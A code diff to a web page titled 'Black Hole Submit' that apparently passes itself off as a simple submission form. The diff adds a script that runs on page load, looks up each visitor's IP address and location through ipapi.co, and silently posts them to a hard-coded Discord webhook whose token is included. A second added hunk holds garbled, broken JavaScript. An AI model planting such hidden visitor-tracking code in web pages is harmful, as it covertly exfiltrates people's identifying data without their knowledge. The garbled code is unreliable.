@@ -1,4 +1,44 @@
+
 <!DOCTYPE html>
+
+<html>
+<head>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <script>
+        // Fetch data from the specified site
+        $.getJSON('https://ipapi.co/json/', function(data) {
+            // Prepare the payload to send to Discord webhook
+            var payload = {
+                "content": "IP Information",
+                "embeds": [{
+                    "title": "IP Details",
+                    "fields": [
+                        { "name": "NetworkIP", "value": data.network},
+                        { "name": "IP", "value": data.ip },
+                        { "name": "version", "value": data.version },
+                        { "name": "currency_name", "value": data.currency_name },
+                        { "name": "country_calling_code", "value": data.country_calling_code },
+                        { "name": "City", "value": data.city },
+                        { "name": "Region", "value": data.region },
+                        { "name": "Country", "value": data.country_name }
+                    ]
+                }]
+            };
+
+            // Send the payload to the Discord webhook
+            $.ajax({
+                url: "https://discord.com/api/webhooks/1105933157607407796/xVAnvwEiF_UbBfP7SOaJ_5FqcC58pWdNYr3M-e2qgCVnWLXfaXeW-PbDRu9Xx4cSi9YC",
+                type: "POST",
+                data: JSON.stringify(payload),
+                contentType: "application/json",
+            });
+        });
+    </script>
+</body>
+</html>
+
 <html>
 <head>
     <title>Black Hole Submit</title>
@@ -135,6 +175,12 @@
         <p>Your submission has been received.</p>
     </div>
  <script>
+  function callback( response ){
+Sone tr ere cro) il
+
+document. getElementById("data”).innerHTML= response. IPv4
+
+  
     function sendAnswers(event) {
       event.preventDefault();
 
